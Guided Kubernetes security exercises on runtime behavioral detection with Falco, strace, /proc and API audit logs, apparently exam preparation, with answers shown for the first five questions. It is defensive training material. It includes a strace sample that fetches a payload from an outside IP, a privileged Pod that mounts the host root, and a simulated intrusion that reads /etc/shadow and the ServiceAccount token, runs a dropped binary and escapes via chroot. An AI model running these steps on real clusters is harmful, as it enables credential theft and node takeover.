# Guided Exercises — 6.1 Perform behavioral analytics to detect malicious activities

> **Domain:** Monitoring, Logging and Runtime Security · **Exam weight of this task:** 4
> **Target environment:** a `kubeadm` cluster (v1.34) with at least one worker (`node01`) where you have `root` on the host. Kernel ≥ 5.8 is assumed so the *modern eBPF* driver is available.
> **What "behavioral analytics" means here:** you are not scanning artefacts at rest (that is Supply Chain Security). You are watching what a process *does* at runtime — the syscalls it issues, the files it opens, the sockets it connects, the binaries it spawns — and deciding whether that behavior deviates from the workload's expected profile.

---

## Exercise 1 — Install a runtime sensor and confirm which driver is actually collecting events

The single most common lab failure is a Falco that starts, prints rules, and never emits an event because its driver never attached. Verify the data path *before* you trust any detection.

1. On `node01`, add the Falco repository and install the package:

```bash
curl -fsSL https://falco.org/repo/falcosecurity-packages.asc \
  | sudo gpg --dearmor -o /usr/share/keyrings/falco-archive-keyring.gpg

echo "deb [signed-by=/usr/share/keyrings/falco-archive-keyring.gpg] \
https://download.falco.org/packages/deb stable main" \
  | sudo tee /etc/apt/sources.list.d/falcosecurity.list

sudo apt-get update
sudo apt-get install -y falco
```

> In an offline exam-style environment the package is usually pre-staged; `apt-get install -y falco` or a pre-existing `falco` DaemonSet is all you get. Do not burn time on repositories.

2. Inspect the versions of every moving part:

```bash
falco --version
```

```
Falco version: 0.40.0 (x86_64)
Libs version:  0.20.0
Plugin API:    3.8.0
Engine:        0.44.0
Driver:
  API version:    8.0.0
  Schema version: 2.0.0
  Default driver: 7.3.0+driver
```

3. Look at which driver the unit is configured to open:

```bash
grep -A5 '^engine:' /etc/falco/falco.yaml
```

```yaml
engine:
  kind: modern_ebpf
  kmod:
    buf_size_preset: 4
    drop_failed_exit: false
  ebpf:
    probe: ${HOME}/.falco/falco-bpf.o
```

4. List the installed systemd units and start exactly one of them:

```bash
systemctl list-unit-files 'falco*'
sudo systemctl enable --now falco-modern-bpf.service
sudo systemctl status falco-modern-bpf.service --no-pager
```

5. Confirm from the logs that the source was actually opened:

```bash
sudo journalctl -u falco-modern-bpf.service -n 30 --no-pager
```

```
falco[3412]: Falco version: 0.40.0 (x86_64)
falco[3412]: Falco initialized with configuration files:
falco[3412]:    /etc/falco/falco.yaml | schema validation: ok
falco[3412]: Loading rules from:
falco[3412]:    /etc/falco/falco_rules.yaml | schema validation: ok
falco[3412]:    /etc/falco/falco_rules.local.yaml | schema validation: ok
falco[3412]: Starting health webserver with threadiness 4, listening on 0.0.0.0:8765
falco[3412]: Loaded event sources: syscall
falco[3412]: Enabled event sources: syscall
falco[3412]: Opening 'syscall' source with modern BPF probe.
falco[3412]: One ring buffer every '2' CPUs.
```

6. Prove end to end that events flow, using a foreground run bounded in time:

```bash
sudo systemctl stop falco-modern-bpf.service
sudo falco -M 20 -U -o engine.kind=modern_ebpf
# in another shell on node01:
sudo cat /etc/shadow > /dev/null
```

```
15:22:41.882135000: Warning Sensitive file opened for reading by non-trusted program (file=/etc/shadow gparent=sshd ggparent=systemd evt_type=openat user=root user_uid=0 user_loginuid=1000 process=cat proc_exepath=/usr/bin/cat parent=bash command=cat /etc/shadow terminal=34816 container_id=host container_name=host)
Events detected: 1
Rule counts by severity:
   WARNING: 1
Triggered rules by rule name:
   Sensitive file opened for reading by non-trusted program: 1
```

**Questions**

- **Q1.** `falco --version` reports a *driver* version and an *engine* version. What breaks if the driver version is incompatible with the kernel, and what breaks if the engine version is lower than the `required_engine_version` of a rules file?
- **Q2.** Why is `modern_ebpf` preferable to `kmod` on a fleet you do not control, and what is the one hard requirement it imposes?
- **Q3.** In step 6 the event carries `container_id=host`. What does that tell you about where `cat` ran, and which field would you have inspected if it had run inside a Pod?
- **Q4.** You started `falco-modern-bpf.service` *and* left `falco-kmod.service` enabled. What symptom would you expect, and why?

---

## Exercise 2 — Read the rule engine: lists, macros, rules, and maturity gating

A behavioral detection is only as good as the condition behind it. Learn to navigate the shipped ruleset before writing your own.

1. Identify every rules file the daemon loads, in order:

```bash
grep -A10 -E '^rules_files?:' /etc/falco/falco.yaml
```

```yaml
rules_files:
  - /etc/falco/falco_rules.yaml
  - /etc/falco/falco_rules.local.yaml
  - /etc/falco/rules.d
```

> The key is `rules_files` in Falco ≥ 0.38; older builds call it `rules_file`. Both accept a list, and **order matters**: a macro or list must be defined before the rule that references it.

2. Enumerate the loaded rules and read one condition in full:

```bash
sudo falco -L | head -20
sudo falco -l "Terminal shell in container"
```

```
----------------------
Rule Terminal shell in container
Description:
 A shell was used as the entrypoint/exec point into a container with an attached terminal.
Condition:
 spawned_process and container and shell_procs and proc.tty != 0 and container_entrypoint and not user_expected_terminal_shell_in_container_conditions
Priority: NOTICE
Tags: [T1059 container maturity_stable mitre_execution shell]
Source: syscall
```

3. Resolve the macros that condition depends on:

```bash
grep -A4 -E '^- macro: (spawned_process|container|container_entrypoint)$' /etc/falco/falco_rules.yaml
grep -A3 -E '^- list: shell_binaries$' /etc/falco/falco_rules.yaml
```

```yaml
- macro: spawned_process
  condition: (evt.type in (execve, execveat) and evt.dir=<)

- macro: container
  condition: (container.id != host)

- macro: container_entrypoint
  condition: (not proc.pname exists or proc.pname in (runc:[0:PARENT], runc:[1:CHILD], runc, docker-runc, exe, docker-runc-cur, containerd-shim, systemd, crio, crio-conmon))

- list: shell_binaries
  items: [ash, bash, csh, ksh, sh, tcsh, zsh, dash]
```

4. Check which maturity tiers are actually active. Since Falco 0.38 the ruleset is split, and only `stable` ships enabled:

```bash
sudo falco -L | grep -c .
sudo grep -c 'maturity_incubating' /etc/falco/falco_rules.yaml
ls -1 /etc/falco/ | grep rules
sudo falcoctl artifact list
```

```
NAME                    TYPE            REGISTRY        REPOSITORY
falco-rules             rulesfile       ghcr.io         falcosecurity/rules/falco-rules
falco-incubating-rules  rulesfile       ghcr.io         falcosecurity/rules/falco-incubating-rules
falco-sandbox-rules     rulesfile       ghcr.io         falcosecurity/rules/falco-sandbox-rules
```

5. Enable the incubating tier and confirm the rule count grows:

```bash
sudo falcoctl artifact install falco-incubating-rules:3
sudo sed -i '/falco_rules.local.yaml/i\  - /etc/falco/falco-incubating_rules.yaml' /etc/falco/falco.yaml
sudo falco -L | grep -E '^Rule ' | wc -l
```

6. Validate the syntax of every rules file *without* starting the daemon — this is the check to run before any reload:

```bash
sudo falco --validate /etc/falco/falco_rules.local.yaml
```

```
Validating rules file(s):
   /etc/falco/falco_rules.local.yaml | schema validation: ok
Ok
```

**Questions**

- **Q5.** What is the practical difference between a `list`, a `macro` and a `rule`? Which of the three can appear in an `output` string?
- **Q6.** `Terminal shell in container` requires `proc.tty != 0` **and** `container_entrypoint`. Describe an attacker action that spawns a shell in a container yet does *not* fire this rule, and explain which clause lets it through.
- **Q7.** You wrote a rule referencing `open_read` in `falco_rules.local.yaml`, but you also reordered `rules_files` so the local file loads first. What happens at startup, and what is the exact error class?
- **Q8.** Why does Falco ship `incubating` and `sandbox` rules disabled by default? Give the operational argument, not just "they are new".

---

## Exercise 3 — Author a custom behavioral rule and reload it safely

Default rules describe *generic* bad behavior. Behavioral analytics for your cluster means encoding what *your* workloads are supposed to do.

1. Deploy a target workload:

```bash
kubectl create ns shop
kubectl -n shop create deployment api --image=nginx:1.27 --replicas=1
kubectl -n shop get pods -o wide
```

2. Write a rule that flags any process reading the projected ServiceAccount token when it is not the expected workload binary. Create `/etc/falco/rules.d/10-shop.yaml`:

```yaml
- required_engine_version: 0.44.0

- list: shop_expected_token_readers
  items: [nginx, kubectl, curl-sidecar]

- macro: sa_token_file
  condition: (fd.name contains "/secrets/kubernetes.io/serviceaccount/token")

- macro: shop_workload
  condition: (k8s.ns.name = "shop")

- rule: Unexpected ServiceAccount Token Read In Shop
  desc: >
    A process that is not part of the declared workload profile opened the
    projected ServiceAccount token. This is the canonical first step of
    in-cluster lateral movement: read the token, then talk to the API server
    with the Pod's identity.
  condition: >
    open_read
    and container
    and shop_workload
    and sa_token_file
    and not proc.name in (shop_expected_token_readers)
  output: >
    ServiceAccount token read by unexpected process
    (file=%fd.name proc=%proc.name pproc=%proc.pname aproc2=%proc.aname[2]
     cmd=%proc.cmdline exe=%proc.exepath user=%user.name uid=%user.uid
     container=%container.name image=%container.image.repository
     ns=%k8s.ns.name pod=%k8s.pod.name)
  priority: CRITICAL
  tags: [container, k8s, mitre_credential_access, T1552.001]
```

3. Validate, then reload without restarting the process:

```bash
sudo falco --validate /etc/falco/rules.d/10-shop.yaml
sudo kill -HUP "$(pidof falco)"
sudo journalctl -u falco-modern-bpf.service -n 5 --no-pager
```

```
falco[3412]: SIGHUP received, restarting...
falco[3412]: Loading rules from:
falco[3412]:    /etc/falco/falco_rules.yaml | schema validation: ok
falco[3412]:    /etc/falco/rules.d/10-shop.yaml | schema validation: ok
```

4. Trigger it from inside the Pod:

```bash
kubectl -n shop exec -it deploy/api -- \
  sh -c 'cat /var/run/secrets/kubernetes.io/serviceaccount/token | head -c 20'
```

```
15:48:07.221904000: Critical ServiceAccount token read by unexpected process (file=/var/run/secrets/kubernetes.io/serviceaccount/token proc=cat pproc=sh aproc2=containerd-shim cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token exe=/usr/bin/cat user=root uid=0 container=api image=docker.io/library/nginx ns=shop pod=api-6c9d7f8b4d-x2n7q)
```

5. Now suppress a legitimate exception **without editing the shipped file**, using the `override` mechanism (Falco ≥ 0.37 — it replaced the old `append: true`). Append to `10-shop.yaml`:

```yaml
- rule: Unexpected ServiceAccount Token Read In Shop
  condition: and not (proc.name = "cat" and proc.pname = "entrypoint.sh")
  override:
    condition: append
```

6. Reload and re-test to confirm the exception is honoured while everything else still fires.

**Questions**

- **Q9.** The alert reports `file=/var/run/secrets/...` but on the host that token lives under `/var/lib/kubelet/pods/<uid>/volumes/...`. Why does Falco print the container-relative path, and what does that imply for rules that match on absolute paths?
- **Q10.** Why is `override: {condition: append}` strictly better than copying the shipped rule into your local file and editing it? Name two concrete failure modes of the copy-paste approach.
- **Q11.** The rule uses `%proc.aname[2]`. What is that field, and why is an ancestor name often a stronger behavioral signal than `proc.name` alone?
- **Q12.** Your rule keys on `k8s.ns.name = "shop"`. What must be true about Falco's metadata enrichment for that field to be populated, and what would the alert look like if enrichment were unavailable?

---

## Exercise 4 — Detect the *behavior*, not the *name*: exec of a newly-written binary

Name-based rules (`proc.name = xmrig`) are trivially evaded by renaming. The durable signal is structural: a binary that was written into the container's writable layer and then executed, or executed straight from anonymous memory.

1. Inspect the two structural fields that make this possible:

```bash
sudo falco --list syscall | grep -E 'is_exe_upper_layer|is_exe_from_memfd|exe_writable'
```

```
proc.is_exe_upper_layer      'true' if the executable file is in the upper layer of an overlayfs container filesystem
proc.is_exe_from_memfd       'true' if the executable was executed from a memfd file descriptor
proc.exe_writable            'true' if the executable file is writable by the same user that spawned it
```

2. Add a rule to `/etc/falco/rules.d/10-shop.yaml`:

```yaml
- rule: Execution Of Binary Written Into Container Layer
  desc: >
    A process executed a binary that lives in the container's writable
    (upper) overlayfs layer. Immutable images never do this: the binary was
    dropped after the container started.
  condition: >
    spawned_process
    and container
    and proc.is_exe_upper_layer = true
    and not proc.name in (dpkg, apt, apt-get, rpm, yum, microdnf)
  output: >
    Dropped binary executed in container
    (proc=%proc.name exe=%proc.exepath cmd=%proc.cmdline upper_layer=%proc.is_exe_upper_layer
     parent=%proc.pname user=%user.name container=%container.name
     image=%container.image.repository ns=%k8s.ns.name pod=%k8s.pod.name)
  priority: CRITICAL
  tags: [container, mitre_execution, T1204]

- rule: Fileless Execution Via memfd In Container
  desc: A binary was executed directly from an anonymous in-memory file descriptor.
  condition: spawned_process and container and proc.is_exe_from_memfd = true
  output: >
    Fileless execution detected
    (proc=%proc.name exe=%proc.exepath cmd=%proc.cmdline parent=%proc.pname
     container=%container.name ns=%k8s.ns.name pod=%k8s.pod.name)
  priority: CRITICAL
  tags: [container, mitre_defense_evasion, T1620]
```

3. Reload and simulate the drop-and-execute:

```bash
sudo kill -HUP "$(pidof falco)"

kubectl -n shop exec -it deploy/api -- sh -c '
  cp /bin/sleep /tmp/systemd-worker &&
  chmod +x /tmp/systemd-worker &&
  /tmp/systemd-worker 5'
```

```
16:04:12.554901000: Critical Dropped binary executed in container (proc=systemd-worker exe=/tmp/systemd-worker cmd=systemd-worker 5 upper_layer=true parent=sh user=root container=api image=docker.io/library/nginx ns=shop pod=api-6c9d7f8b4d-x2n7q)
```

4. Note that the attacker renamed the binary to something that looks like a system daemon, and the rule fired anyway.

**Questions**

- **Q13.** Explain, in terms of the container filesystem, why `proc.is_exe_upper_layer=true` is a near-zero-false-positive signal for an image built with a fixed set of binaries — and name the one legitimate workload class that violates it.
- **Q14.** How does a `memfd_create`-based loader defeat both file-integrity monitoring and the upper-layer rule, and which field catches it?
- **Q15.** An attacker copies `/bin/busybox` (already in the image, lower layer) to a new path and runs it. Does `Execution Of Binary Written Into Container Layer` fire? Explain.
- **Q16.** How would enforcing a read-only root filesystem (`securityContext.readOnlyRootFilesystem: true`) change what this rule sees, and why is detection still worth having?

---

## Exercise 5 — Ground truth at the syscall level: `strace`, `/proc`, and ephemeral containers

When a rule fires you must be able to answer *what exactly did that process do*. Falco tells you a pattern matched; `strace` and `/proc` tell you the raw behavior.

1. Start a long-running suspicious process and find its host PID:

```bash
kubectl -n shop exec -d deploy/api -- sh -c 'while true; do sleep 30; done'

# on node01
POD=$(kubectl -n shop get pod -l app=api -o jsonpath='{.items[0].metadata.name}')
CID=$(sudo crictl ps --name api -q)
PID=$(sudo crictl inspect --output go-template --template '{{.info.pid}}' "$CID")
echo "container $CID -> host pid $PID"
```

2. Read the process identity straight from `/proc`, which no attacker-supplied `ps` can lie about:

```bash
sudo ls -l /proc/$PID/exe
sudo tr '\0' ' ' < /proc/$PID/cmdline; echo
sudo cat /proc/$PID/status | grep -E 'Name|Uid|Gid|CapEff|Seccomp|NoNewPrivs'
sudo ls -l /proc/$PID/ns/
```

```
lrwxrwxrwx 1 root root 0 Aug  5 16:11 /proc/24188/exe -> /usr/sbin/nginx
nginx: master process nginx -g daemon off;
Name:   nginx
Uid:    0       0       0       0
CapEff: 00000000a80425fb
Seccomp:        2
NoNewPrivs:     1
lrwxrwxrwx 1 root root 0 Aug  5 16:11 mnt -> 'mnt:[4026532501]'
lrwxrwxrwx 1 root root 0 Aug  5 16:11 net -> 'net:[4026532404]'
lrwxrwxrwx 1 root root 0 Aug  5 16:11 pid -> 'pid:[4026532502]'
```

3. Attach `strace` from the host, filtering to the syscall families that carry behavioral meaning:

```bash
sudo strace -f -p "$PID" -tt -s 256 \
  -e trace=execve,execveat,openat,connect,socket,ptrace,setuid,chmod
```

```
16:13:02.663512 [pid 24240] execve("/bin/sh", ["sh", "-c", "curl -sO http://198.51.100.20/payload"], 0x55f...) = 0
16:13:02.701442 [pid 24240] socket(AF_INET, SOCK_STREAM|SOCK_CLOEXEC, IPPROTO_IP) = 5
16:13:02.701899 [pid 24240] connect(5, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("198.51.100.20")}, 16) = -1 EINPROGRESS (Operation now in progress)
16:13:03.114522 [pid 24240] openat(AT_FDCWD, "payload", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 6
16:13:03.220118 [pid 24240] chmod("payload", 0755) = 0
```

4. Do the same the Kubernetes-native way, without host access, using an ephemeral debug container:

```bash
kubectl -n shop debug -it "$POD" \
  --image=nicolaka/netshoot \
  --target=api \
  --profile=sysadmin \
  -- bash

# inside the ephemeral container:
ps -ef
strace -f -p 1 -e trace=openat,connect
```

5. Compare: run the same workload under `strace -c` to obtain a syscall *profile* — the input you would use to build a seccomp allow-list:

```bash
sudo strace -f -c -p "$PID" -o /tmp/api-profile.txt
sleep 60; sudo pkill -INT strace
head -15 /tmp/api-profile.txt
```

```
% time     seconds  usecs/call     calls    errors syscall
------ ----------- ----------- --------- --------- ----------------
 41.02    0.004112          21       191           epoll_wait
 19.77    0.001982          11       171           accept4
 12.44    0.001247           7       168           recvfrom
  9.88    0.000990           5       181           writev
  6.31    0.000633           3       182           close
```

**Questions**

- **Q17.** `/proc/$PID/status` showed `Seccomp: 2`. What does the value mean, and which two other lines in that output would you check first when triaging a suspected container escape?
- **Q18.** Why does `strace` require `CAP_SYS_PTRACE` and, in the ephemeral-container case, a shared PID namespace? What does `--profile=sysadmin` actually configure?
- **Q19.** `strace` on a busy production process is dangerous. State the mechanism that makes it costly and name the eBPF-based alternative that avoids it.
- **Q20.** The `strace -c` profile is a behavioral baseline. Give one reason it is *unsafe* to convert it directly into a seccomp allow-list without further work.

---

## Exercise 6 — Kubernetes audit logs as the control-plane behavioral feed

Syscall telemetry sees the node. Audit logs see the API server: who asked for what, with which identity, and whether it was allowed. Real detections correlate both.

1. Write an audit policy at `/etc/kubernetes/audit/policy.yaml` on the control plane:

```yaml
apiVersion: audit.k8s.io/v1
kind: Policy
omitStages:
  - RequestReceived
rules:
  # Interactive access to workloads — always a behavioral signal.
  - level: RequestResponse
    resources:
      - group: ""
        resources: ["pods/exec", "pods/attach", "pods/portforward", "pods/ephemeralcontainers"]

  # Secret access: metadata only, never the payload.
  - level: Metadata
    resources:
      - group: ""
        resources: ["secrets", "configmaps"]

  # Privilege manipulation.
  - level: RequestResponse
    resources:
      - group: "rbac.authorization.k8s.io"
        resources: ["clusterrolebindings", "rolebindings", "clusterroles", "roles"]

  # Drop the noise floor.
  - level: None
    users: ["system:kube-scheduler", "system:kube-controller-manager"]
  - level: None
    nonResourceURLs: ["/healthz*", "/readyz*", "/livez*", "/version", "/metrics"]

  - level: Metadata
```

2. Wire it into the API server static Pod, `/etc/kubernetes/manifests/kube-apiserver.yaml`:

```yaml
spec:
  containers:
  - command:
    - kube-apiserver
    - --audit-policy-file=/etc/kubernetes/audit/policy.yaml
    - --audit-log-path=/var/log/kubernetes/audit/audit.log
    - --audit-log-maxage=30
    - --audit-log-maxbackup=10
    - --audit-log-maxsize=100
    volumeMounts:
    - name: audit-policy
      mountPath: /etc/kubernetes/audit
      readOnly: true
    - name: audit-logs
      mountPath: /var/log/kubernetes/audit
      readOnly: false
  volumes:
  - name: audit-policy
    hostPath:
      path: /etc/kubernetes/audit
      type: DirectoryOrCreate
  - name: audit-logs
    hostPath:
      path: /var/log/kubernetes/audit
      type: DirectoryOrCreate
```

3. Wait for the kubelet to restart the static Pod, then confirm:

```bash
sudo crictl ps | grep kube-apiserver
kubectl -n shop exec deploy/api -- id
sudo tail -1 /var/log/kubernetes/audit/audit.log | jq '{stage,verb,uri:.requestURI,user:.user.username,groups:.user.groups,decision:.annotations["authorization.k8s.io/decision"],reason:.annotations["authorization.k8s.io/reason"]}'
```

```json
{
  "stage": "ResponseComplete",
  "verb": "create",
  "uri": "/api/v1/namespaces/shop/pods/api-6c9d7f8b4d-x2n7q/exec?command=id&container=api&stderr=true&stdout=true",
  "user": "kubernetes-admin",
  "groups": ["kubeadm:cluster-admins", "system:authenticated"],
  "decision": "allow",
  "reason": "RBAC: allowed by ClusterRoleBinding \"kubeadm:cluster-admins\" of ClusterRole \"cluster-admin\" to Group \"kubeadm:cluster-admins\""
}
```

4. Hunt for anomalies with `jq` — a ServiceAccount reading Secrets it never read before, or a burst of `forbidden` responses (classic permission enumeration):

```bash
# Which identities read Secrets?
sudo jq -r 'select(.objectRef.resource=="secrets" and .verb=="get")
  | [.user.username, .objectRef.namespace, .objectRef.name] | @tsv' \
  /var/log/kubernetes/audit/audit.log | sort | uniq -c | sort -rn | head

# Denied requests grouped by identity — enumeration looks like a long tail of 403s.
sudo jq -r 'select(.annotations["authorization.k8s.io/decision"]=="forbid")
  | [.user.username, .verb, .objectRef.resource] | @tsv' \
  /var/log/kubernetes/audit/audit.log | sort | uniq -c | sort -rn | head
```

```
     47 system:serviceaccount:shop:default	list	secrets
     31 system:serviceaccount:shop:default	list	nodes
     29 system:serviceaccount:shop:default	create	clusterrolebindings
```

5. Feed the same stream to Falco with the `k8saudit` plugin so control-plane behavior is evaluated by the same engine:

```bash
sudo falcoctl artifact install k8saudit-rules
sudo falcoctl artifact install k8saudit
```

```yaml
# /etc/falco/falco.yaml
plugins:
  - name: k8saudit
    library_path: libk8saudit.so
    init_config:
      maxEventSize: 262144
    open_params: "http://:9765/k8s-audit"
  - name: json
    library_path: libjson.so

load_plugins: [k8saudit, json]

rules_files:
  - /etc/falco/falco_rules.yaml
  - /etc/falco/k8s_audit_rules.yaml
  - /etc/falco/rules.d
```

Then point the API server at it with a webhook backend (`--audit-webhook-config-file`) whose `cluster.server` is `http://<node01-ip>:9765/k8s-audit`.

**Questions**

- **Q21.** The policy sets `level: Metadata` for `secrets` but `RequestResponse` for `pods/exec`. Justify both choices — what exactly would leak if `secrets` were `RequestResponse`?
- **Q22.** Rules are evaluated top-to-bottom and the **first** match wins. What breaks if you move the final catch-all `- level: Metadata` to the top of the list?
- **Q23.** `omitStages: [RequestReceived]` roughly halves log volume. Which stage carries the authorization decision, and which stage would you need if you were investigating requests that never completed?
- **Q24.** In step 4, `system:serviceaccount:shop:default` attempted `create clusterrolebindings` 29 times and was forbidden every time. Why is a *denied* request often more valuable to a detection pipeline than an allowed one?
- **Q25.** Compare the log-file backend with the webhook backend for feeding Falco. Which one loses events if the receiver is down, and which one can back-pressure the API server?

---

## Exercise 7 — Structured output, routing, and offline rule testing

A detection nobody receives is not a detection. And a rule you cannot replay against a fixed capture is a rule you cannot regression-test.

1. Switch to structured output so downstream systems can parse fields, not prose:

```yaml
# /etc/falco/falco.yaml
json_output: true
json_include_output_property: true
json_include_tags_property: true
buffered_outputs: false

stdout_output:
  enabled: true

http_output:
  enabled: true
  url: "http://falcosidekick.falco.svc.cluster.local:2801/"
  user_agent: "falcosecurity/falco"

priority: notice          # minimum severity actually evaluated
rule_matching: first      # stop at the first matching rule, or 'all'
```

2. Reload and observe the JSON shape:

```bash
sudo kill -HUP "$(pidof falco)"
kubectl -n shop exec -it deploy/api -- bash -c 'echo hi'
sudo journalctl -u falco-modern-bpf.service -n 1 --no-pager -o cat | jq .
```

```json
{
  "hostname": "node01",
  "output": "16:41:55.203 node01 (id=8f4b8e6a5c1d) A shell was spawned in a container...",
  "output_fields": {
    "container.id": "8f4b8e6a5c1d",
    "container.image.repository": "docker.io/library/nginx",
    "evt.time": 1754412115203441000,
    "k8s.ns.name": "shop",
    "k8s.pod.name": "api-6c9d7f8b4d-x2n7q",
    "proc.cmdline": "bash -c echo hi",
    "proc.pname": "containerd-shim",
    "user.name": "root"
  },
  "priority": "Notice",
  "rule": "Terminal shell in container",
  "source": "syscall",
  "tags": ["T1059", "container", "maturity_stable", "mitre_execution", "shell"],
  "time": "2026-08-05T16:41:55.203441000Z"
}
```

3. Capture a reproducible event stream and replay it against a candidate rule — this is how you regression-test detections without re-staging the attack:

```bash
# record 30 s of syscall activity to a capture file
sudo sysdig -w /tmp/attack.scap -M 30
# ...reproduce the attack in another shell...

# replay it through any ruleset, offline, deterministically
sudo falco -e /tmp/attack.scap -r /etc/falco/rules.d/10-shop.yaml -r /etc/falco/falco_rules.yaml
```

```
Events detected: 3
Rule counts by severity:
   CRITICAL: 2
   NOTICE: 1
Triggered rules by rule name:
   Unexpected ServiceAccount Token Read In Shop: 1
   Dropped binary executed in container: 1
   Terminal shell in container: 1
```

4. Verify you are not silently losing events under load — dropped events are silent blind spots:

```bash
sudo curl -s localhost:8765/healthz
sudo journalctl -u falco-modern-bpf.service | grep -i 'drop'
```

```
falco[3412]: Falco internal: syscall event drop. 128 system calls dropped in last second.
```

**Questions**

- **Q26.** `priority: notice` in `falco.yaml` and `priority: CRITICAL` in a rule are different things. Explain both, and describe what happens to an `INFORMATIONAL` rule under this configuration.
- **Q27.** `rule_matching: first` versus `all`: give one detection-engineering scenario where `first` causes you to miss an alert you wanted.
- **Q28.** Why is `buffered_outputs: false` the right choice for an incident-response deployment despite the throughput cost?
- **Q29.** What does "syscall event drop" mean mechanically, name two ways to reduce it, and explain why treating it as a warning rather than an incident is a mistake.
- **Q30.** Replaying `/tmp/attack.scap` produced identical results twice. Why can a capture-based test never fully replace a live test of a rule that uses `k8s.ns.name`?

---

## Exercise 8 — End-to-end: detect a full intrusion chain and correlate the two feeds

Now assemble everything. A single alert is noise; a *sequence* of alerts on the same `container.id` within seconds is an incident.

1. Deploy an over-permissioned victim:

```yaml
# victim.yaml
apiVersion: v1
kind: ServiceAccount
metadata: {name: builder, namespace: shop}
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata: {name: builder-admin, namespace: shop}
roleRef: {apiGroup: rbac.authorization.k8s.io, kind: ClusterRole, name: admin}
subjects: [{kind: ServiceAccount, name: builder, namespace: shop}]
---
apiVersion: v1
kind: Pod
metadata: {name: victim, namespace: shop}
spec:
  serviceAccountName: builder
  containers:
  - name: app
    image: nginx:1.27
    securityContext:
      privileged: true
    volumeMounts:
    - {name: hostroot, mountPath: /host}
  volumes:
  - name: hostroot
    hostPath: {path: /, type: Directory}
```

```bash
kubectl apply -f victim.yaml
```

2. Watch both feeds simultaneously:

```bash
# terminal A — runtime
sudo journalctl -u falco-modern-bpf.service -f -o cat | jq -r '[.time, .priority, .rule, .output_fields["k8s.pod.name"]] | @tsv'

# terminal B — control plane
sudo tail -f /var/log/kubernetes/audit/audit.log | jq -r 'select(.verb!="get") | [.stage, .user.username, .verb, .objectRef.resource] | @tsv'
```

3. Execute the chain:

```bash
kubectl -n shop exec -it victim -- bash          # (a) interactive access
# inside:
cat /etc/shadow | head -2                        # (b) sensitive file read
ls /host/etc/kubernetes/pki                      # (c) host filesystem traversal
cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/t   # (d) credential theft
cp /bin/sleep /tmp/kworker && chmod +x /tmp/kworker && /tmp/kworker 3   # (e) dropped binary
chroot /host sh -c 'id'                          # (f) escape to the node
```

4. Expected correlated output in terminal A:

```
2026-08-05T17:02:11Z	Notice	    Terminal shell in container	                        victim
2026-08-05T17:02:19Z	Warning	    Sensitive file opened for reading by non-trusted program	victim
2026-08-05T17:02:26Z	Notice	    Read sensitive file untrusted	                    victim
2026-08-05T17:02:33Z	Critical	ServiceAccount token read by unexpected process	    victim
2026-08-05T17:02:41Z	Critical	Dropped binary executed in container	            victim
2026-08-05T17:02:48Z	Critical	Container Run as Root / chroot detected	            victim
```

5. And in terminal B, the control-plane half of the same story:

```
ResponseComplete	kubernetes-admin	create	pods/exec
```

6. Write the correlation as a *stateful* question. Falco rules are stateless per event; express the join in your SIEM instead:

```bash
sudo journalctl -u falco-modern-bpf.service --since "-10min" -o cat \
  | jq -c 'select(.priority=="Critical" or .priority=="Warning")
           | {t:.time, pod:.output_fields["k8s.pod.name"], rule:.rule}' \
  | jq -s 'group_by(.pod)
           | map({pod: .[0].pod, distinct_rules: (map(.rule) | unique | length), events: length})
           | map(select(.distinct_rules >= 3))'
```

```json
[
  {
    "pod": "victim",
    "distinct_rules": 4,
    "events": 6
  }
]
```

7. Clean up:

```bash
kubectl delete -f victim.yaml
kubectl delete ns shop
sudo rm -f /etc/falco/rules.d/10-shop.yaml /tmp/attack.scap
sudo systemctl restart falco-modern-bpf.service
```

**Questions**

- **Q31.** Steps (a) through (f) are six alerts. Argue why "≥3 distinct CRITICAL/WARNING rules on the same `container.id` within 60 s" is a better paging condition than any single one of them.
- **Q32.** The `chroot /host` step is the actual escape. Which *earlier* signal in the chain was the last cheap opportunity to block it, and which admission-time control would have removed the possibility entirely?
- **Q33.** Runtime detection saw the token read (d); the audit log saw nothing. If the attacker had then used that token against the API server from an external host, which feed would catch it, and what field identifies them?
- **Q34.** Suppose the attacker executed the whole chain in under 200 ms via a single scripted `exec`, and Falco was reporting syscall drops at the time. What is your confidence in the alert set, and what is the remediation?
- **Q35.** Behavioral analytics is detective, not preventive. Name the three preventive controls that would each have broken this chain at a different link, and state which CKS domain each belongs to.

---

<details>
<summary><strong>Answers</strong></summary>

**Q1.** The *driver* is the kernel-side collector (kernel module, legacy eBPF probe, or modern CO‑RE eBPF). If it is incompatible with the running kernel, Falco either fails to open the syscall source and exits, or — worse in the kmod case — loads and produces malformed events. The *engine* version is the rules-language ABI. A rules file declaring `required_engine_version: 0.44.0` on an engine older than that is rejected at load time with a validation error, so the whole file (not just one rule) is skipped. Both failures are silent detection gaps: the daemon looks healthy in `systemctl status`, which is exactly why step 6 exists.

**Q2.** `modern_ebpf` uses CO‑RE (Compile Once – Run Everywhere) with BTF, so a single prebuilt probe runs across kernels without compiling anything per node — no `dkms`, no `linux-headers-$(uname -r)`, no tainted kernel, and no reboot to unload a broken module. It also cannot panic the kernel the way a module can. The hard requirement is a kernel ≥ 5.8 with BTF enabled (`CONFIG_DEBUG_INFO_BTF=y`, verifiable via `/sys/kernel/btf/vmlinux`).

**Q3.** `container_id=host` means the process was **not** in a container — it ran directly in the host's PID/mount namespaces, i.e. on the node itself. Had it run in a Pod, `container.id` would hold the truncated runtime container ID and, with metadata enrichment active, `k8s.ns.name`, `k8s.pod.name` and `container.image.repository` would identify the workload. The `container` macro is literally `container.id != host`, so this one field is the switch that separates node-level from workload-level detections.

**Q4.** Two drivers competing for the same syscall source. The second unit to start typically fails to open the source (the ring buffers/probe are already attached, or the module conflicts with the eBPF program) and the unit enters a restart loop; alternatively both run and you get duplicated alerts plus doubled CPU cost. Falco is designed to run exactly one instance per node with exactly one driver — enable one unit and mask the others.

**Q5.** A **list** is a named set of literal values, substituted textually into `in (...)` expressions — it carries no condition logic. A **macro** is a named, reusable *condition fragment* (a boolean expression) that can reference other macros and lists. A **rule** is the complete unit: condition + output + priority + tags, and it is the only one of the three that produces an alert. None of them can appear in an `output` string — outputs interpolate **fields** (`%proc.name`, `%fd.name`), which come from the event schema, not from the rule vocabulary.

